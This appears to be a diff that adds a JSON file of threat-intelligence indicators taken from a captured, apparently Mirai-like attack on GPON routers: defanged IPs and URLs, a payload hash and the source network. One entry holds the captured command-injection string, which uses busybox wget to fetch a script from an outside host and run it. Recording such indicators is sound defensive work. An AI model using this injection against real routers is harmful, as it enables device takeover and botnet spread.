@@ -1,0 +1,33 @@
+[
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://140[.]233[.]190[.]XXX/gpon+-O+/tmp/ger;sh+/tmp/ger"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "140[.]233[.]190.XXX"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+hxxp://140[.]233[.]190[.]XXX/gpon+-O+/tmp/ger;sh+/tmp/"
+  },
+  {
+    "context": "Inbound payload hash (mirai-like)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "7025d7b28d0c57288012703bbd17c0b8f762bebd364e77dea4648b92b45928c5"
+  },
+  {
+    "asn": "TELEFONICA BRASIL S.A",
+    "country": "Brazil",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "179[.]130[.]237.XXX"
+  }
+]
